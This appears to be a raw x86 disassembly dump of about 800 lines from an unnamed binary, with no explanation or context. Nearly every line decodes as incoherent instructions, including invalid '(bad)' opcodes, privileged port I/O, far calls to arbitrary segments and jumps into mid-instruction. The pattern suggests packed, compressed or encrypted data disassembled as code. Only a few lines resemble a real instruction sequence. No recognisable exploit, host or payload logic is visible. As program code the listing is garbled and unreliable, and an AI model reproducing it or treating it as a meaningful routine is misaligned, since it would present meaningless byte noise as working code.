  40891e:	xor    DWORD PTR [ebx+0x56b1bbb3],esp
  408924:	cli    
  408925:	pop    es
  408926:	pop    ebx
  408927:	mov    bl,BYTE PTR [edx]
  408929:	sub    bl,dl
  40892b:	fild   QWORD PTR [esi]
  40892d:	(bad)  
  40892e:	aad    0xcb
  408930:	xor    esi,DWORD PTR [edx+0x57d57366]
  408936:	mov    ah,0xae
  408938:	enter  0x4b65,0xbd
  40893c:	hlt    
  40893d:	add    ch,cl
  40893f:	ficomp WORD PTR [edx]
  408941:	cmp    eax,0xb401abcb
  408946:	aam    0x9
  408948:	enter  0xe8e3,0xdf
  40894c:	jl     0x4089b1
  40894e:	or     edi,edx
  408950:	data16 aam 0x23
  408953:	xchg   ecx,eax
  408954:	fld    QWORD PTR [ebp+ebp*1-0x4]
  408958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408959:	adc    BYTE PTR [esi],dl
  40895b:	arpl   WORD PTR ds:0x321625c,sp
  408961:	push   cs
  408962:	mov    bl,cl
  408964:	inc    eax
  408965:	addr16 sbb eax,0xb39e4190
  40896b:	xchg   ecx,eax
  40896c:	xchg   edx,eax
  40896d:	push   DWORD PTR [edi]
  40896f:	sbb    al,0xad
  408971:	cmp    eax,0x41e453a7
  408976:	cld    
  408977:	sbb    BYTE PTR [edi-0x7],0xe2
  40897b:	jno    0x40895a
  40897d:	jne    0x408957
  40897f:	mov    esi,0xc12e1498
  408984:	jno    0x40891a
  408986:	test   al,0xe0
  408989:	push   es
  40898a:	and    DWORD PTR [ebx+0x4d049ef9],0xeaa98d83
  408994:	mov    bl,0x4f
  408996:	pusha  
  408997:	and    al,0x4f
  408999:	inc    ebp
  40899a:	stos   BYTE PTR es:[edi],al
  40899b:	pop    edi
  40899c:	pusha  
  40899d:	mov    al,BYTE PTR ds:0x7e34dfb4
  4089a3:	xor    bh,BYTE PTR [esi-0x3a203e77]
  4089a9:	mov    ch,0x95
  4089ab:	fiadd  WORD PTR [eax]
  4089ad:	mov    DWORD PTR [ebx-0x7cc8df68],ecx
  4089b3:	xor    al,0x32
  4089b5:	dec    BYTE PTR [ebp-0x7e]
  4089b8:	xlat   BYTE PTR ds:[ebx]
  4089b9:	fisub  DWORD PTR [edi-0x6b710b3a]
  4089bf:	jl     0x408a17
  4089c1:	shl    dl,1
  4089c3:	test   BYTE PTR [eax-0x20e00c75],cl
  4089c9:	repnz pop edx
  4089cb:	xchg   BYTE PTR [ebx],dl
  4089cd:	sbb    eax,0x67bdd653
  4089d2:	jmp    0x8ef9e10e
  4089d7:	cmp    bh,BYTE PTR [edi+ebx*2-0x2e5d1797]
  4089de:	adc    BYTE PTR [ebx+ebx*4],bl
  4089e1:	mov    esi,0x4b2a27e1
  4089e6:	test   BYTE PTR [edi+0x219dc8d3],bl
  4089ec:	mov    BYTE PTR [ebp-0x3f],dh
  4089ef:	arpl   WORD PTR [edx+0x49],ax
  4089f2:	and    DWORD PTR [ebx+0x70],ebx
  4089f5:	leave  
  4089f6:	out    dx,eax
  4089f7:	js     0x408a64
  4089f9:	stc    
  4089fa:	adc    DWORD PTR [edx+0x5bedd536],eax
  408a00:	sub    DWORD PTR [edx],0xfffffff2
  408a03:	test   BYTE PTR [eax-0x4f72e17d],0x50
  408a0a:	pop    edx
  408a0b:	fstp   QWORD PTR [edx]
  408a0d:	sbb    DWORD PTR [edx-0x1d524a7a],eax
  408a13:	call   0x3df7:0x35a22410
  408a1a:	jo     0x4089a0
  408a1c:	fiadd  WORD PTR [eax-0x3b8e8653]
  408a22:	sub    al,BYTE PTR [ebx-0xb]
  408a25:	jge    0x4089da
  408a27:	push   esi
  408a28:	cwde   
  408a29:	call   FWORD PTR [edx]
  408a2b:	iret   
  408a2c:	outs   dx,DWORD PTR ds:[esi]
  408a2d:	fs jmp 0x99bf:0x4ac9bf9c
  408a35:	mov    ds:0x20e1a0cb,al
  408a3a:	mov    gs,WORD PTR [ebp+0x7359f984]
  408a40:	jle    0x408a68
  408a42:	ficom  WORD PTR [esp+edx*8+0x5c5aaef8]
  408a49:	ret    0xaf83
  408a4c:	jne    0x4089eb
  408a4e:	xchg   esi,eax
  408a4f:	jbe    0x408a7d
  408a51:	mov    eax,0xef08399d
  408a56:	or     DWORD PTR [esi+0x149eb3cd],eax
  408a5c:	push   eax
  408a5d:	inc    esi
  408a5e:	mov    edi,0xd6cdceba
  408a63:	dec    ecx
  408a64:	outs   dx,BYTE PTR ds:[esi]
  408a65:	dec    ecx
  408a66:	ret    0x301e
  408a69:	adc    ebx,DWORD PTR [eax]
  408a6b:	mov    al,0x73
  408a6d:	(bad)  
  408a6e:	jmp    0x408ad7
  408a70:	rcr    DWORD PTR ds:0x6b3f60c0,0x1d
  408a77:	mov    edx,0xf8d08941
  408a7c:	inc    ebx
  408a7d:	mov    dl,al
  408a7f:	call   0x1f2f:0x4a432545
  408a86:	test   al,0xd5
  408a88:	dec    ebp
  408a89:	adc    DWORD PTR [edi+edx*2+0x26],esi
  408a8d:	add    cl,BYTE PTR [eax+0x3a]
  408a90:	mov    ds:0x34d3027f,eax
  408a95:	test   BYTE PTR [eax+ecx*1+0x7e94c199],0x30
  408a9d:	pop    ebp
  408a9e:	ficomp DWORD PTR [edx+0x7485fc29]
  408aa4:	out    0xf5,al
  408aa6:	adc    ecx,DWORD PTR [ebx+edi*2+0x53]
  408aaa:	lock sti 
  408aac:	out    0xbc,al
  408aae:	mov    ebp,0xb642e548
  408ab3:	add    ebp,edi
  408ab5:	cdq    
  408ab6:	sub    edi,DWORD PTR [esi+0x3b]
  408ab9:	ins    DWORD PTR es:[edi],dx
  408aba:	cmc    
  408abb:	fs pushf 
  408abd:	mov    bl,0x3a
  408abf:	test   eax,0x3d429ad4
  408ac4:	xor    eax,0xc83a74de
  408ac9:	mov    dl,0xb9
  408acb:	je     0x408abe
  408acd:	dec    eax
  408ace:	retf   
  408acf:	adc    eax,0x1524532c
  408ad4:	cmp    ch,BYTE PTR [edi]
  408ad6:	and    ebp,edi
  408ad8:	std    
  408ad9:	inc    ecx
  408ada:	test   BYTE PTR [edi+0x6e09d7fb],0x85
  408ae1:	dec    eax
  408ae2:	out    dx,al
  408ae3:	xor    al,0x1e
  408ae5:	sbb    DWORD PTR [ecx+0x58],0x3316fde9
  408aec:	les    ebp,FWORD PTR [ebx-0x716ec71a]
  408af2:	or     ch,ah
  408af4:	int    0x6f
  408af6:	mov    dh,0x1e
  408af8:	add    eax,0xd5674929
  408afd:	js     0x408aac
  408aff:	aad    0xfc
  408b01:	push   edx
  408b02:	jo     0x408b52
  408b04:	inc    ebp
  408b05:	dec    BYTE PTR ds:0x73ac4e66
  408b0b:	xor    al,0x93
  408b0d:	jae    0x408ad2
  408b0f:	fst    DWORD PTR [ebx+0x14d1b677]
  408b15:	jge    0x408b1c
  408b17:	lock fcom DWORD PTR [esi]
  408b1a:	out    dx,al
  408b1b:	enter  0x10cb,0xd
  408b1f:	and    ebp,edx
  408b21:	push   edi
  408b22:	jp     0x408b6b
  408b24:	jg     0x408b0d
  408b26:	push   edx
  408b27:	sub    dh,BYTE PTR [edx+0x23]
  408b2a:	arpl   WORD PTR [ecx+0x3c031e11],dx
  408b30:	icebp  
  408b31:	adc    eax,0xd7842786
  408b36:	add    eax,0xd369f00d
  408b3b:	mov    ecx,0x33800538
  408b40:	and    eax,0xc6b6ffe7
  408b45:	pop    edi
  408b46:	jae    0x408b6f
  408b48:	push   ebp
  408b49:	iret   
  408b4a:	ret    
  408b4b:	pushf  
  408b4c:	adc    al,dh
  408b4e:	outs   dx,DWORD PTR ds:[esi]
  408b4f:	xchg   esp,eax
  408b50:	ret    0x822b
  408b53:	aaa    
  408b54:	inc    eax
  408b55:	and    eax,0xc9bbc86e
  408b5a:	jne    0x408b33
  408b5c:	in     eax,0xa3
  408b5e:	cmc    
  408b5f:	cwde   
  408b60:	adc    dl,BYTE PTR [eax-0x70b61a3c]
  408b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b67:	add    ch,dh
  408b69:	call   0x78d9:0x12c6ae0f
  408b70:	(bad)  
  408b71:	push   esp
  408b72:	mov    ch,0x14
  408b74:	push   ebx
  408b75:	aas    
  408b76:	sub    al,0x9
  408b78:	neg    ch
  408b7a:	aas    
  408b7b:	jb     0x408b86
  408b7d:	jmp    0xbd8d9f12
  408b82:	(bad)  
  408b83:	repnz fnstcw WORD PTR [eax]
  408b86:	push   esi
  408b87:	cmp    DWORD PTR [esi-0x63],edi
  408b8a:	cmp    ebp,DWORD PTR [esi]
  408b8c:	(bad)  
  408b8d:	sti    
  408b8e:	sahf   
  408b8f:	or     eax,DWORD PTR [edx]
  408b91:	dec    esp
  408b92:	int3   
  408b93:	ficomp DWORD PTR [ebp+0x40a43a41]
  408b99:	idiv   DWORD PTR ds:0x7d7c25e3
  408b9f:	or     BYTE PTR [ebx+0x67],0x23
  408ba3:	pop    eax
  408ba4:	out    dx,eax
  408ba5:	jo     0x408b4f
  408ba7:	fwait
  408ba8:	(bad)  
  408ba9:	lahf   
  408baa:	add    eax,0x8911f1bc
  408baf:	ror    BYTE PTR [edi],1
  408bb1:	cmp    eax,0x9b8c5ede
  408bb6:	xchg   ch,dl
  408bb8:	pushf  
  408bb9:	scas   al,BYTE PTR es:[edi]
  408bba:	aas    
  408bbb:	xor    al,0x91
  408bbd:	mov    ah,0x91
  408bbf:	adc    al,0x67
  408bc1:	in     al,dx
  408bc2:	int3   
  408bc3:	mov    eax,0x15bb6b37
  408bc8:	dec    ebx
  408bc9:	dec    ebp
  408bca:	sbb    ah,bh
  408bcc:	sbb    DWORD PTR [ebp+0x49508da2],ebx
  408bd2:	or     al,0xcf
  408bd4:	js     0x408c11
  408bd6:	or     eax,0xdbfa5efc
  408bdb:	jo     0x408be8
  408bdd:	and    esp,DWORD PTR [ebp+0x20e18448]
  408be3:	pop    esp
  408be4:	or     al,BYTE PTR [edi]
  408be6:	inc    ebp
  408be7:	icebp  
  408be8:	sbb    edi,ebp
  408bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408beb:	pop    eax
  408bec:	pop    gs
  408bee:	out    0x3f,al
  408bf0:	inc    ecx
  408bf1:	hlt    
  408bf2:	add    al,0x8d
  408bf4:	inc    edi
  408bf5:	and    cl,dl
  408bf7:	popf   
  408bf8:	dec    esi
  408bf9:	fidivr WORD PTR [eax]
  408bfb:	fwait
  408bfc:	sahf   
  408bfd:	imul   esi,edx,0xf45e89e9
  408c03:	push   ecx
  408c04:	retf   
  408c05:	add    al,0xd6
  408c07:	icebp  
  408c08:	(bad)  
  408c09:	push   ds
  408c0a:	sub    DWORD PTR [ebp+0x12],ebp
  408c0d:	clc    
  408c0e:	(bad)  
  408c0f:	lock ror DWORD PTR [eax+ecx*4-0x1e2d0bcc],0x0
  408c18:	call   0x55531388
  408c1d:	shl    cl,cl
  408c1f:	out    0xb5,al
  408c21:	(bad)  
  408c22:	not    ah
  408c24:	cmc    
  408c25:	loope  0x408bd7
  408c27:	cmc    
  408c28:	jl     0x408bbd
  408c2a:	rol    BYTE PTR [ebx-0xfe8c180],0x72
  408c31:	pop    eax
  408c32:	sbb    al,0xc7
  408c35:	mov    WORD PTR [ecx-0x312cfcc2],gs
  408c3b:	mov    bl,0x47
  408c3d:	fmul   QWORD PTR [ecx+0x34bf1f06]
  408c43:	repz pop es
  408c45:	add    al,0x5e
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	(bad)  
  408c70:	(bad)  [ebp-0x26b812b2]
  408c76:	jo     0x408ce8
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c39
  408c7d:	fs sbb al,0x7b
  408c80:	pop    edx
  408c81:	dec    eax
  408c82:	int3   
  408c83:	inc    edi
  408c84:	ins    DWORD PTR es:[edi],dx
  408c85:	push   es
  408c86:	push   ebx
  408c87:	arpl   bx,bp
  408c89:	sub    dh,al
  408c8b:	sbb    DWORD PTR [edi+0x21],esi
  408c8e:	adc    eax,0x8b830258
  408c93:	sub    al,0xff
  408c95:	add    al,0xcd
  408c97:	cmp    BYTE PTR [ebx+0x3d295538],ah
  408c9d:	shl    BYTE PTR [ecx],1
  408c9f:	imul   ecx,DWORD PTR [ebp+0x686646e9],0x59
  408ca6:	mov    ebp,0x5fdbaef5
  408cab:	dec    edx
  408cac:	xlat   BYTE PTR ds:[ebx]
  408cad:	jl     0x408c31
  408caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb0:	sbb    eax,0x82fefab2
  408cb5:	cs pop ebp
  408cb7:	fwait
  408cb8:	add    al,0xcf
  408cba:	scas   al,BYTE PTR es:[edi]
  408cbb:	sahf   
  408cbc:	adc    BYTE PTR [ebp-0x28],0x5
  408cc0:	inc    edx
  408cc1:	mov    ebx,cs
  408cc3:	sbb    al,0x6c
  408cc5:	fcmove st,st(2)
  408cc7:	add    DWORD PTR [ebx+0x6552b610],esp
  408ccd:	dec    ecx
  408cce:	dec    eax
  408ccf:	push   ss
  408cd0:	cli    
  408cd1:	mov    ecx,0x2e9acf17
  408cd6:	adc    al,0x96
  408cd8:	sbb    al,0x12
  408cda:	xor    bh,BYTE PTR [esi-0x2c]
  408cdd:	push   esi
  408cde:	mov    ch,0x32
  408ce0:	test   BYTE PTR ss:[esi-0x6d],ah
  408ce4:	jns    0x408c69
  408ce6:	out    0x82,al
  408ce8:	mov    esp,0x699de8ab
  408ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cee:	ror    DWORD PTR [ebx+0x128ba50d],1
  408cf4:	std    
  408cf5:	aas    
  408cf6:	or     dh,BYTE PTR [edx+ebp*4+0x6f]
  408cfa:	popa   
  408cfb:	push   eax
  408cfc:	pavgb  mm4,QWORD PTR [edx]
  408cff:	outs   dx,BYTE PTR ds:[esi]
  408d00:	imul   esi,DWORD PTR [edi+0x4d22e65c],0x3e9e46dc
  408d0a:	iret   
  408d0b:	pop    ebp
  408d0c:	out    0xd2,al
  408d0e:	xchg   ecx,eax
  408d0f:	and    cl,cl
  408d11:	call   0xa0171c85
  408d16:	xor    DWORD PTR [ebp-0x5f1f77da],ebx
  408d1c:	mov    al,ds:0xaae52375
  408d21:	sub    esp,DWORD PTR [ebp+edi*8-0x1557e01d]
  408d28:	adc    eax,edx
  408d2a:	cmp    bh,ch
  408d2c:	push   eax
  408d2d:	mov    al,ds:0x25b9b867
  408d32:	in     al,dx
  408d33:	sar    BYTE PTR [ecx],1
  408d35:	fwait
  408d36:	icebp  
  408d37:	ins    DWORD PTR es:[edi],dx
  408d38:	retf   
  408d39:	fwait
  408d3a:	adc    eax,0xb70fbe21
  408d3f:	imul   ebx,DWORD PTR [edi-0x6d],0xa476b0b7
  408d46:	cmp    ebx,DWORD PTR [eax]
  408d48:	jo     0x408d81
  408d4a:	inc    eax
  408d4b:	test   eax,0x57c555ae
  408d50:	iret   
  408d51:	cmp    DWORD PTR [edx],eax
  408d53:	inc    edi
  408d54:	data16 hlt 
  408d56:	jo     0x408d17
  408d58:	or     dl,BYTE PTR [ecx]
  408d5a:	stos   BYTE PTR es:[edi],al
  408d5b:	push   0xffffffe3
  408d5d:	or     BYTE PTR [ebp-0x1635662c],dl
  408d63:	inc    ebp
  408d64:	inc    ebp
  408d65:	mov    esi,0x7114cfc0
  408d6a:	sub    cl,dl
  408d6c:	jp     0x408d00
  408d6e:	lock fcomip st,st(7)
  408d71:	sbb    ah,ah
  408d73:	adc    al,0x20
  408d75:	inc    eax
  408d76:	adc    al,0x47
  408d78:	jle    0x408d18
  408d7a:	jge    0x408df8
  408d7c:	lahf   
  408d7d:	in     eax,dx
  408d7e:	inc    ebx
  408d7f:	or     dl,BYTE PTR [eax-0x49c9c48c]
  408d85:	dec    ebx
  408d86:	sahf   
  408d87:	pop    ebx
  408d88:	popa   
  408d89:	sbb    eax,0xbfaeb05a
  408d8e:	pop    eax
  408d8f:	sbb    BYTE PTR [ebp+0x4],cl
  408d92:	add    DWORD PTR [ecx],eax
  408d94:	jns    0x408d68
  408d96:	sbb    eax,0xf6359e64
  408d9b:	xor    BYTE PTR gs:[edi],dh
  408d9e:	stos   BYTE PTR es:[edi],al
  408d9f:	sub    BYTE PTR [edx],cl
  408da1:	cs dec esp
  408da3:	retf   0xd9ad
  408da6:	dec    ebp
  408da7:	js     0x408db7
  408da9:	nop
  408daa:	lds    ecx,FWORD PTR [edx+0x17]
  408dad:	(bad)  
  408dae:	imul   ebx,edi,0x8d1ae61a
  408db4:	loop   0x408df4
  408db6:	sbb    eax,0x1ea60546
  408dbb:	fs cld 
  408dbd:	xchg   ecx,eax
  408dbe:	sbb    eax,0x51b28b67
  408dc3:	out    0xec,al
  408dc5:	out    0x66,eax
  408dc7:	sar    DWORD PTR [esi],cl
  408dc9:	lahf   
  408dca:	stos   DWORD PTR es:[edi],eax
  408dcb:	jnp    0x408dba
  408dcd:	xchg   edi,eax
  408dce:	fmul   QWORD PTR [edi]
  408dd0:	and    DWORD PTR [ebp+0x7d2bcd37],edi
  408dd6:	xchg   ecx,eax
  408dd7:	rol    edx,1
  408dd9:	pop    ds
  408dda:	clc    
  408ddb:	iret   
  408ddc:	pop    edi
  408ddd:	jmp    edx
  408ddf:	out    dx,eax
  408de0:	mov    DWORD PTR [eax-0x179bf482],ebp
  408de6:	inc    esp
  408de7:	in     eax,dx
  408de8:	or     DWORD PTR [ecx],edi
  408dea:	gs mov cl,0xeb
  408ded:	jo     0x408e3a
  408def:	ja     0x408de5
  408df1:	add    al,0x3e
  408df3:	in     al,0xa3
  408df5:	mov    WORD PTR [edx+0x6f],?
  408df8:	sbb    al,0x74
  408dfa:	lods   al,BYTE PTR ds:[esi]
  408dfb:	xor    al,0xf0
  408dfd:	mov    edx,0x827dd8cf
  408e02:	std    
  408e03:	pop    ebp
  408e04:	mov    esi,0x5eeb7785
  408e09:	xchg   edi,edi
  408e0b:	call   0xf31:0xfa534324
  408e12:	ins    BYTE PTR es:[edi],dx
  408e13:	mov    BYTE PTR [ebx+0x61],ah
  408e16:	push   ss
  408e17:	or     DWORD PTR [ecx],eax
  408e19:	dec    eax
  408e1a:	add    dl,BYTE PTR [esi]
  408e1c:	xchg   esp,eax
  408e1d:	mov    ds:0x1e738e6d,eax
  408e22:	fwait
  408e23:	inc    DWORD PTR [ecx]
  408e25:	in     al,0x85
  408e27:	push   edx
  408e28:	ds ds aam 0x28
  408e2c:	sti    
  408e2d:	push   eax
  408e2e:	jle    0x408ea8
  408e30:	jp     0x408dc9
  408e32:	je     0x408e19
  408e34:	fist   WORD PTR [edx-0x3e]
  408e37:	dec    edi
  408e38:	dec    ecx
  408e39:	xor    al,BYTE PTR [ebx+0x6]
  408e3c:	xchg   edx,eax
  408e3d:	push   ebp
  408e3e:	sub    al,BYTE PTR ds:0xc6d2ef52
  408e44:	mov    ecx,0x9adc38b4
  408e49:	ficom  WORD PTR [ecx-0x2b63cdb5]
  408e4f:	js     0x408e1b
  408e51:	jp     0x408e1b
  408e53:	adc    dl,BYTE PTR [ebp+0x6a]
  408e56:	pop    edi
  408e57:	ror    dh,cl
  408e59:	pushf  
  408e5a:	xchg   esi,eax
  408e5b:	and    ch,BYTE PTR [edi+edi*2]
  408e5e:	sub    al,0xd0
  408e60:	lds    ebx,FWORD PTR [edi+0x29]
  408e63:	push   ds
  408e64:	jle    0x408e3f
  408e66:	mov    al,0x68
  408e68:	pop    ebp
  408e69:	fsubr  DWORD PTR [edx]
  408e6b:	pop    es
  408e6c:	aad    0x7a
  408e6e:	(bad)  
  408e6f:	or     BYTE PTR [esi],ah
  408e71:	lahf   
  408e72:	adc    eax,0x89359b9a
  408e77:	sbb    al,0x51
  408e79:	jecxz  0x408e79
  408e7b:	pop    esp
  408e7c:	jnp    0x408ea7
  408e7e:	aaa    
  408e7f:	mov    al,ds:0x4e98f0c4
  408e84:	les    ebp,FWORD PTR [edi]
  408e86:	pop    ecx
  408e87:	pop    es
  408e88:	shr    dh,1
  408e8a:	pop    ss
  408e8b:	mov    BYTE PTR [esi],cl
  408e8d:	mov    ds:0x7f3916fb,eax
  408e92:	aas    
  408e93:	sub    BYTE PTR [ebx+0x4bafe9dd],cl
  408e99:	rcl    BYTE PTR [ecx+edx*8+0x8e1fe26],cl
  408ea0:	xchg   esp,edx
  408ea2:	adc    ebp,DWORD PTR [ebx+0x1fe7b14c]
  408ea8:	or     al,0xcb
  408eaa:	fild   DWORD PTR [ecx-0x527043a9]
  408eb0:	jmp    0x408ef5
  408eb2:	mov    edx,0x63b22494
  408eb7:	les    ecx,FWORD PTR [ecx]
  408eb9:	adc    cl,BYTE PTR [ebp-0x16b1b01e]
  408ebf:	xor    BYTE PTR [ebx],dl
  408ec1:	gs sub al,0x4a
  408ec4:	cmp    eax,0x41b4315e
  408ec9:	jbe    0x408ea4
  408ecb:	add    bl,BYTE PTR [ecx+0x2e8cf4eb]
  408ed1:	imul   ebx,edx,0x3d698796
  408ed7:	mov    bl,0x68
  408ed9:	inc    ebp
  408eda:	and    DWORD PTR [eax+edx*1+0x17],ebp
  408ede:	mov    bh,BYTE PTR ds:0xe93ac1ff
  408ee4:	fwait
  408ee5:	mov    ebp,0xa552237
  408eea:	mov    eax,ds:0xba151c5d
  408eef:	push   esp
  408ef0:	xlat   BYTE PTR ds:[ebx]
  408ef1:	push   edi
  408ef2:	out    0xe3,eax
  408ef4:	adc    edx,esi
  408ef6:	out    0x9e,al
  408ef8:	mov    cl,0x71
  408efa:	pop    ss
  408efb:	sub    esi,0xed23b1a7
  408f01:	mov    ds:0x46776c24,al
  408f06:	xchg   ebp,eax
  408f07:	fnstsw ax
  408f09:	in     eax,dx
  408f0a:	out    0x5a,al
  408f0c:	xchg   edi,eax
  408f0d:	pusha  
  408f0e:	nop
  408f0f:	repz adc eax,0x1025805b
  408f15:	sub    DWORD PTR [eax-0x50],ebp
  408f18:	jmp    0x408f10
  408f1a:	jo     0x408f44
  408f1c:	iret   
  408f1d:	fimul  DWORD PTR [ecx-0x23]
  408f20:	ja     0x408f9f
  408f22:	sbb    DWORD PTR [esi],esp
  408f24:	test   eax,0x6f085b7b
  408f29:	sbb    eax,0xfdb7f402
  408f2e:	adc    DWORD PTR [ebp+0x6d],esi
  408f31:	xor    eax,0x274ad78b
  408f36:	int3   
  408f37:	push   edi
  408f38:	mov    ebx,edx
  408f3a:	fistp  WORD PTR gs:[edx+0x54]
  408f3e:	loop   0x408eec
  408f40:	add    edi,DWORD PTR [ecx+0x557977fa]
  408f46:	push   edi
  408f47:	sbb    DWORD PTR [esi+0x48245935],0x3668a2b
  408f51:	sub    eax,0x389f4f26
  408f56:	addr16 pusha 
  408f58:	shl    DWORD PTR [eax+0xc],cl
  408f5b:	das    
  408f5c:	push   ecx
  408f5d:	mov    ebx,gs
  408f5f:	call   0x666f:0x72cd689
  408f66:	pop    ds
  408f67:	mov    BYTE PTR [ebx+0x22cc41a4],bl
  408f6d:	repz fwait
  408f6f:	ins    DWORD PTR es:[edi],dx
  408f70:	sbb    eax,0xe3ce1204
  408f75:	enter  0xd2,0xf5
  408f79:	(bad)  
  408f7a:	std    
  408f7b:	mov    ecx,0xfd8999e3
  408f80:	hlt    
  408f81:	int3   
  408f82:	repz pop eax
  408f84:	and    BYTE PTR [edx],0x90
  408f87:	lds    edi,FWORD PTR [ecx+0x72bec27f]
  408f8d:	test   DWORD PTR ds:0xd2c9f06e,ebp
  408f93:	mov    ebx,0xe5a852fd
  408f98:	leave  
  408f99:	mov    ds:0xe350dd07,eax
  408f9e:	xchg   DWORD PTR [esi+0x264a8e90],ebp
  408fa4:	and    al,BYTE PTR [edx+0x7093163d]
  408faa:	push   ss
  408fab:	loop   0x408fac
  408fad:	xor    BYTE PTR [ebp+0x41b02c05],cl
  408fb3:	add    cl,ch
  408fb5:	dec    eax
  408fb6:	add    eax,DWORD PTR [eax]
  408fb8:	add    BYTE PTR [esp+edi*2],al
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xd61937f3
  408fc6:	xlat   BYTE PTR ds:[ebx]
  408fc7:	fdivr  st,st(2)
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408fbe
  408fd2:	cmp    bh,BYTE PTR [eax+eiz*2-0x2]
  408fd6:	or     al,0x64
  408fd8:	sub    al,BYTE PTR [eax+0x4c034998]
  408fde:	in     al,0x6d
  408fe0:	push   0x25129104
  408fe5:	mov    al,ds:0x9b13fc24
  408fea:	push   0xc
  408fec:	mov    ah,0x27
  408fee:	push   cs
  408fef:	int3   
  408ff0:	dec    esi
  408ff1:	std    
  408ff2:	data16 fistp DWORD PTR ds:[esi-0x13]
  408ff7:	xchg   esp,eax
  408ff8:	test   BYTE PTR [esi-0x62],dl
  408ffb:	in     eax,dx
  408ffc:	or     al,0xb7
  408ffe:	lahf   
  408fff:	xlat   BYTE PTR ds:[ebx]
  409000:	jge    0x409006
  409002:	and    DWORD PTR [edx+0x57],ebx
  409005:	xor    eax,0x2ab9ef1f
  40900a:	push   esi
  40900b:	pop    ebx
  40900c:	sub    eax,0xa0c2687c
  409011:	(bad)  
  409012:	pop    ebp
  409013:	ret    
  409014:	sbb    eax,0xa1f80cd7
  409019:	cwde   
  40901a:	sbb    DWORD PTR [edx],ecx
  40901c:	lahf   
  40901d:	aad    0x58
  40901f:	adc    al,0x26
  409021:	in     eax,0x17
  409023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409024:	js     0x409042
  409026:	lds    ecx,FWORD PTR [esi-0x7d]
  409029:	enter  0x80fd,0x8b
  40902d:	mov    ch,0x73
  40902f:	sti    
  409030:	sub    dh,BYTE PTR [eax+0x1ebbc52f]
  409036:	push   edi
  409037:	call   FWORD PTR [ecx]
  409039:	je     0x408fe2
  40903b:	xchg   ebp,eax
  40903c:	fucomi st,st(5)
  40903e:	mov    edi,0xf3c1a756
  409043:	inc    edx
  409044:	rcr    dl,0xd5
  409047:	xor    dl,BYTE PTR [esi-0xd]
  40904a:	dec    esi
  40904b:	in     eax,0xc5
  40904d:	cmp    al,BYTE PTR [esi-0x39]
  409050:	sub    al,0x9f
  409052:	adc    BYTE PTR [edx-0x528bc2a6],dh
  409058:	fs sbb al,0x54
  40905b:	outs   dx,DWORD PTR ds:[esi]
  40905c:	fs mov esi,0x45f5a9b3
  409062:	mov    al,0x9d
  409064:	jmp    0x3620:0x9c186c28
  40906b:	push   esi
  40906c:	inc    esp
  40906d:	inc    ecx
  40906e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40906f:	mov    WORD PTR [ebx+0x788abcc9],es
  409075:	iret   
  409076:	ja     0x409093
  409078:	(bad)  
  409079:	or     eax,0xf195c5bb
  40907e:	jbe    0x40901f
  409080:	or     DWORD PTR [edx+0x21],ecx
  409083:	ins    DWORD PTR es:[edi],dx
  409084:	push   ds
  409085:	mov    edi,0x8d6a4416
  40908a:	jnp    0x409078
  40908c:	fisttp WORD PTR [ebx-0x11]
  40908f:	sub    eax,0x3b8f9205
  409094:	push   ds
  409095:	dec    ebx
  409096:	cmp    bh,ah
  409098:	push   ss
  409099:	sbb    BYTE PTR [esp+edi*8+0x16],ch
  40909d:	popa   
  40909e:	mov    ebx,0x53796f0f
  4090a3:	jae    0x409102
  4090a5:	cmp    ebx,edx
  4090a7:	(bad)  
  4090a8:	(bad)  [esi+0x6d]
  4090ab:	adc    esp,DWORD PTR [esi+0x39]
  4090ae:	inc    edx
  4090af:	sub    ebp,ecx
  4090b1:	xchg   ebp,eax
  4090b2:	or     DWORD PTR [ebx+0x59],esi
  4090b5:	sub    al,0x7c
  4090b7:	sti    
  4090b8:	mov    ecx,0x9b12a866
  4090bd:	dec    edx
  4090be:	mov    ebp,0x6d33f4e1
  4090c3:	loopne 0x409113
  4090c5:	cmp    dh,BYTE PTR [eax]
  4090c7:	fs div BYTE PTR cs:[edi+0x42b69dff]
  4090cf:	jbe    0x409087
  4090d1:	adc    dh,dh
  4090d3:	jo     0x4090ed
  4090d5:	jo     0x40910d
  4090d7:	xor    DWORD PTR [ecx],ebx
  4090d9:	cmp    esp,ecx
  4090db:	dec    ebx
  4090dc:	adc    al,0xf
  4090de:	add    edi,DWORD PTR [esi+0x22]
  4090e1:	adc    BYTE PTR ds:0x104a8317,dh
  4090e7:	push   ds
  4090e8:	mov    eax,0x48a64f14
  4090ed:	outs   dx,DWORD PTR ds:[esi]
  4090ee:	fwait
  4090ef:	ret    0x1b35
  4090f2:	inc    esi
  4090f3:	imul   esp,DWORD PTR [ecx-0x7e7efa56],0x4f
  4090fa:	outs   dx,DWORD PTR ds:[esi]
  4090fb:	mov    ebp,0x6eaef8ea
  409100:	jbe    0x40911d
  409102:	stos   BYTE PTR es:[edi],al
  409103:	dec    edx
  409104:	xor    al,0x35
  409106:	ins    BYTE PTR es:[edi],dx
  409107:	popf   
  409108:	data16 icebp 
  40910a:	cmp    BYTE PTR [ebp+0x10],ah
  40910d:	inc    esp
  40910e:	outs   dx,DWORD PTR ds:[esi]
  40910f:	adc    esp,DWORD PTR ds:0xfdb377a5
  409115:	sub    eax,0x31e7071a
  40911a:	out    0x26,eax
  40911c:	and    dl,bh
